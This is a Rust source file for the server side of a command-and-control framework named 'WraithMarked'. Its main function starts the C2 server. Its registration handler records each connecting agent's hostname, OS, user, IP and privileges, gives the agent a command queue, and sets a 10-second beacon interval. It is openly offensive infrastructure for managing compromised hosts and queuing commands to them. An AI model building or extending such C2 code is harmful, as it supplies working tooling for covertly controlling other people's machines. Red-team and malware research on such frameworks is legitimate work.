use axum::{Json, extract::State};

use crate::models::{Agent, AppState, RegisterRequest, RegisterResponse};
use chrono::Utc;
use std::{
    collections::VecDeque,
    sync::{Arc, Mutex},
};

mod c2_server;
mod models;

type SharedState = Arc<Mutex<AppState>>;

#[tokio::main]
async fn main() {
    println!("===========================================");
    println!("    WraithMarked C2 Server Starting...   ");
    println!("===========================================\n");

    // Start the HTTP server
    c2_server::start_server().await;
}
async fn handle_register(
    State(state): State<SharedState>,
    Json(req): Json<RegisterRequest>,
) -> Json<RegisterResponse> {
    println!("📥 Registration request from agent: {}", req.agent_id);

    // Lock the state to modify it
    let mut state = state.lock().unwrap();

    // Create Agent struct from request
    let agent = Agent {
        id: req.agent_id.clone(),
        hostname: req.hostname,
        os: req.os,
        os_version: req.os_version,
        user: req.user,
        ip: req.ip,
        privileges: req.privileges,
        version: req.version,
        last_seen: Utc::now(),
        first_seen: Utc::now(),
    };

    // Store agent in HashMap
    state.agents.insert(req.agent_id.clone(), agent.clone());

    // Initialize empty command queue for this agent
    state
        .command_queues
        .insert(req.agent_id.clone(), VecDeque::new());

    println!("✅ Agent registered: {} ({})", agent.hostname, agent.id);
    println!(
        "   OS: {} | User: {} | IP: {}",
        agent.os, agent.user, agent.ip
    );

    // Return success response
    Json(RegisterResponse {
        success: true,
        message: "Agent registered successfully".to_string(),
        beacon_interval: 10, // Agent should beacon every 10 seconds
    })
}
